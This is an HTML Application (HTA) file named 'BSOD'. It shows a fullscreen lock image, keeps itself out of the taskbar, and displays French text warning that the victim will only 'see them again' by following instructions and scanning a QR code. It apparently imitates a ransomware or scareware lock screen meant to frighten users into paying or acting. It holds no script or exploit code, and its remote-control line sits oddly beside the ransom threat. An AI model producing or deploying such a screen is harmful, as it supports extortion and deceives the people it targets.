<!DOCTYPE html>
<html>
<head>
<title>App</title>
<hta:application id="fullscreenImage" size="fullscreen" applicationname="BSOD" showintaskbar="no" windowstate="maximize" resizable="yes" version="2.0" maximizebutton="yes" minimizebutton="yes" sysmenu="yes" caption="yes" />
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
        }

        #background-image {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
			z-index: -1;
        }
		img {
		position: relative;
		left: 500px;
		}

#Hello {
  margin-top: 10px;
  padding: 15px 50px;
  background-color: transparent;
  color: White;
  Font-family: Elephant;
  border: none;
  font-size: 22px;
  border-radius: 15px;
  position: fixed;
  top: 5%;
  left: 5%;
  display: inline-flex;
  align-items: center;
   text-shadow: black;
}




    </style>
</head>
<body>
		<img id="background-image" src="Lock.jpeg" alt="" width="100" height="100">
    <div id="output-container">
        <div id="output"></div>
    </div>
<button id="Hello">Contrôlez votre PC à distance en un clic<br>Si vous souhaitez les revoir un jour, suivez les instructions à la lettre:
<br> <br> 1)Scannez le Qr code à l'aide d'un appareil et suivez les instructions
</button>
